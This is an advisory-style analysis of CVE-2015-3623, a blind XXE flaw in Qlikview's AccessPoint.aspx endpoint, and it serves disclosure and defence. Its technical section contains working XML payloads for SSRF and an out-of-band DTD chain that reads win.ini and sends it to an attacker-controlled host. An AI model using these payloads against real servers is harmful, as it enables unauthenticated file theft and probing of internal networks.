Based on the provided content, here's an analysis of CVE-2015-3623:

**Root Cause of Vulnerability:**
The root cause of this vulnerability is the improper restriction of XML External Entity (XXE) references in the Qlikview platform. Specifically, the platform is susceptible to DTD parameter injections, which are "blind" because the server doesn't provide any visual feedback about the vulnerability.

**Weaknesses/Vulnerabilities Present:**
- **XML External Entity (XXE) Injection:** The platform is vulnerable to XXE attacks due to its flawed processing of XML input.
- **Blind XXE:** The lack of server response to the injected XML makes it a blind vulnerability.
- **DTD Parameter Injection:** The vulnerability specifically involves the injection of malicious DTD parameters.

**Impact of Exploitation:**
An attacker can leverage this vulnerability to achieve the following:
  - **Server-Side Request Forgery (SSRF):**  Force the Qlikview server to make requests to arbitrary URLs, possibly on the internal network. This can be used to probe internal services or exfiltrate data.
  - **Arbitrary File Reading:** Read arbitrary files from the server's file system. This can expose sensitive information like configuration files, databases, source code, etc.

**Attack Vectors:**
- The attack vector is through HTTP POST requests to `/AccessPoint.aspx` or other endpoints that process XML.
- The malicious payload is delivered within the XML document in the body of the POST request.

**Required Attacker Capabilities/Position:**
- An attacker needs to be able to send HTTP POST requests to the vulnerable Qlikview server.
- No prior authentication or specific privileges on the Qlikview platform are required to exploit the vulnerability.
- They need to be able to host a malicious DTD file on an accessible server for the arbitrary file reading attack.

**Technical Details:**

The exploit uses the following payloads:

1.  **SSRF Payload:**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE update [
    <!ENTITY % external SYSTEM "http://yourserver.com">
    %external;]>
    ```
    or
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag PUBLIC "-//WHITE//NINJA//EN" "http://yourserver.com">
    ```
    This forces the server to make an HTTP request to `yourserver.com`. This can also be done with `ftp` and `https` protocols.

2.  **Arbitrary File Reading Payload:**
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag [
    <!ENTITY % remote SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % dtd SYSTEM "http://yourserver.com/test.dtd">
    %dtd;
    %send;
    ]]>
    ```
    With `test.dtd` file content:
    ```dtd
    <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://yourserver.com/?%remote;'>">
    %all;
    ```
    This payload reads the `/c:/windows/win.ini` file and sends its content as a parameter in an HTTP request to `yourserver.com`
    
**Additional Information:**

- The vulnerability affects Qlikview versions 11.20 SR11 and earlier.
- It was patched in version 11.20 SR12.
- The vulnerability was publicly disclosed on 08/09/2015 after the vendor released a fix.
